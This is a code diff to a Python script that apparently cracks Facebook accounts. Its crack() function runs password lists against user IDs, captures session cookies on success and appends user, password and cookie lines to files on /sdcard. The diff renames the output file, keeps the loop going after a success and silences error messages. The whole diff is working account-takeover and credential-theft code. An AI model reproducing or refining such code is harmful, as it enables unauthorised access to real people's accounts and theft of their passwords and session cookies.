@@ -167,7 +167,7 @@ def crack(uid, password_list, total_count):
                 fail_count = len(cps)
                 percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
             
-            sys.stdout.write(f"\r{color}[CRACKING] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]                   ")
+            sys.stdout.write(f"\r{color}CRACKING {progress} \033[1;92m{success_count}\033[1;97m:\033[1;91m{fail_count} \033[1;93m{percentage:.1f}%")
             sys.stdout.flush()
             
             # Create session and generate device hash
@@ -233,12 +233,11 @@ def crack(uid, password_list, total_count):
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    print('\033[1;92m [OK] '+user+' | '+pw+'')
+                    print('\033[1;92m OK '+user+'|'+pw+'')
                     print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                    open("/sdcard/vvvvvvvv/cookies.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
-                    open("/sdcard/vvvvvvvv/uid.txt","a").write(user+"|"+pw+"\n")
-                    oks.append(uid)
-                    break
+                    open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
+                    oks.append(user)
+                    continue
             elif 'checkpoint' in log_cookies:
                 print(f"\r\033[1;93m [⚠ SUMON_2f] {uid} | {pw}")
                 open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
@@ -261,7 +260,7 @@ def crack(uid, password_list, total_count):
         print(f"\r\033[1;93m [Interrupted] User stopped the process")
         raise
     except Exception as e:
-        print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
+        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
         return False
     
     return False
